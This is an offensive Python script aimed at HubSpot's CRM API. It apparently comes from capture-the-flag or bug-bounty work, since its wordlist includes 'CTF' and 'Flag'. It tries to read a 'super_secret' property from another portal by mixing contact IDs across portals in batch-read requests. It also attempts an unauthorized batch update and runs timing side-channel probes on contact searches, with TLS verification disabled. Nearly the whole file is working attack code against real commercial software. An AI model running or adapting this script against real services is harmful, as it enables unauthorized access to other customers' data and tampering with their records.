#!/usr/bin/env python3
"""
Batch API and Timing Side-Channel Attacks
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import time
import statistics

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'
OUR_PORTAL = '50708459'

print("="*80)
print("BATCH API AND TIMING ATTACKS")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. BATCH API - Try to bypass authorization by mixing portals
# ============================================================================

print("\n[1] BATCH API AUTHORIZATION BYPASS ATTEMPTS")
print("="*80)

# Try batch read with mixed contact IDs from different portals
batch_read_url = 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read'

batch_payloads = [
    # Mix target portal contact with our portal contact
    {
        'inputs': [
            {'id': '1'},  # Target portal
            {'id': '175137521012'},  # Our portal (we know this exists)
        ],
        'properties': ['firstname', 'super_secret', 'email'],
        'portalId': TARGET_PORTAL
    },
    # Try with reverse order
    {
        'inputs': [
            {'id': '175137521012'},  # Our portal first
            {'id': '1'},  # Target portal second
        ],
        'properties': ['firstname', 'super_secret', 'email'],
        'portalId': TARGET_PORTAL
    },
    # Try batch with only target
    {
        'inputs': [
            {'id': '1'},
            {'id': '2'},
            {'id': '3'},
        ],
        'properties': ['firstname', 'super_secret', 'email'],
        'portalId': TARGET_PORTAL
    },
    # Try batch update (might leak current values in error)
    {
        'inputs': [
            {
                'id': '1',
                'properties': {
                    'lastname': 'Test'
                }
            }
        ]
    },
]

for i, payload in enumerate(batch_payloads, 1):
    print(f"\n  [Batch Test {i}]")
    print(f"  Payload: {json.dumps(payload, indent=2)[:200]}")

    try:
        r = requests.post(batch_read_url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code in [200, 207]:
            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:600]}")

                # Check if we got any data
                if 'results' in data and data['results']:
                    print(f"\n  *** GOT {len(data['results'])} RESULTS! ***")

                    for result in data['results']:
                        if 'properties' in result:
                            print(f"    Properties: {json.dumps(result['properties'], indent=2)[:300]}")

                            if 'super_secret' in result['properties']:
                                print(f"\n    *** SUPER_SECRET FOUND! ***")
                                findings.append({'type': 'batch_read', 'result': result})
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# Try batch update
batch_update_url = 'https://api.hubapi.com/crm/v3/objects/contacts/batch/update'

update_payload = {
    'inputs': [
        {
            'id': '1',
            'properties': {
                'lastname': 'TestUpdate'
            }
        }
    ]
}

print(f"\n  [Batch Update Test]")

try:
    r = requests.post(batch_update_url, json=update_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

    print(f"  Status: {r.status_code}")

    if r.status_code in [200, 207]:
        try:
            data = r.json()
            print(f"  Response: {json.dumps(data, indent=2)}")

            if 'results' in data and data['results']:
                print(f"\n  *** UPDATE SUCCEEDED! ***")
                # The response might include current property values
        except:
            print(f"  Response: {r.text[:300]}")
except:
    pass

# ============================================================================
# 2. TIMING SIDE-CHANNEL ATTACKS
# ============================================================================

print("\n" + "="*80)
print("[2] TIMING SIDE-CHANNEL ATTACKS")
print("="*80)

# Idea: If firstname is "John", asking for contacts with firstname="John"
# might take different time than firstname="Jane"

api_url = f'https://api.hubapi.com/crm/v3/objects/contacts/search'

# Common first names to test
common_names = [
    'John', 'Jane', 'Michael', 'Sarah', 'David', 'Lisa',
    'Test', 'Demo', 'Sample', 'User', 'Admin', 'CTF',
    'Flag', 'Secret', 'Hidden', 'Mystery'
]

timing_results = {}

print(f"\nTesting response times for different firstname values...")

for name in common_names:
    payload = {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'firstname',
                'operator': 'EQ',
                'value': name
            }]
        }],
        'properties': ['firstname'],
        'limit': 1
    }

    timings = []

    # Test each name 5 times to get average
    for attempt in range(5):
        try:
            start = time.time()
            r = requests.post(api_url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
            elapsed = (time.time() - start) * 1000  # Convert to ms

            if r.status_code == 200:
                timings.append(elapsed)
        except:
            pass

        time.sleep(0.1)  # Small delay between requests

    if timings:
        avg_time = statistics.mean(timings)
        timing_results[name] = avg_time

print(f"\nTiming results (average of 5 requests each):")

for name, avg_time in sorted(timing_results.items(), key=lambda x: x[1], reverse=True):
    print(f"  {name:15s}: {avg_time:6.2f} ms")

# Look for outliers
if timing_results:
    all_times = list(timing_results.values())
    mean_time = statistics.mean(all_times)
    stdev_time = statistics.stdev(all_times) if len(all_times) > 1 else 0

    print(f"\nStatistics:")
    print(f"  Mean: {mean_time:.2f} ms")
    print(f"  StdDev: {stdev_time:.2f} ms")

    if stdev_time > 0:
        outliers = [(name, time) for name, time in timing_results.items() if abs(time - mean_time) > 2 * stdev_time]

        if outliers:
            print(f"\nPotential outliers (>2 standard deviations):")
            for name, time_val in outliers:
                print(f"  {name}: {time_val:.2f} ms (diff: {abs(time_val - mean_time):.2f} ms)")

                findings.append({
                    'type': 'timing_outlier',
                    'firstname': name,
                    'time': time_val,
                    'deviation': abs(time_val - mean_time)
                })

# ============================================================================
# 3. SEARCH WITH PROPERTY EXISTS TIMING
# ============================================================================

print("\n" + "="*80)
print("[3] PROPERTY EXISTS TIMING TEST")
print("="*80)

# Test if properties with values respond differently than empty properties

property_tests = [
    ('super_secret', 'HAS_PROPERTY'),
    ('super_secret', 'NOT_HAS_PROPERTY'),
    ('firstname', 'HAS_PROPERTY'),
    ('firstname', 'NOT_HAS_PROPERTY'),
]

for prop, operator in property_tests:
    payload = {
        'filterGroups': [{
            'filters': [{
                'propertyName': prop,
                'operator': operator
            }]
        }],
        'properties': [prop],
        'limit': 1
    }

    timings = []

    for attempt in range(5):
        try:
            start = time.time()
            r = requests.post(api_url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
            elapsed = (time.time() - start) * 1000

            if r.status_code == 200:
                timings.append(elapsed)

                # Also check response
                data = r.json()
                total = data.get('total', 0)

                if attempt == 0:  # Print once
                    print(f"\n  {prop} {operator}:")
                    print(f"    Results: {total}")

                    if total > 0:
                        print(f"    *** FOUND CONTACTS WITH {prop}! ***")
                        findings.append({
                            'type': 'property_exists',
                            'property': prop,
                            'operator': operator,
                            'count': total
                        })
        except:
            pass

        time.sleep(0.1)

    if timings:
        avg = statistics.mean(timings)
        print(f"    Avg time: {avg:.2f} ms")

print("\n" + "="*80)
print("BATCH AND TIMING ATTACKS COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} INTERESTING RESULTS! ***\n")

    with open('/home/user/Hub/findings/batch_timing_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)}")
else:
    print("\nNo timing anomalies or batch bypasses found.")
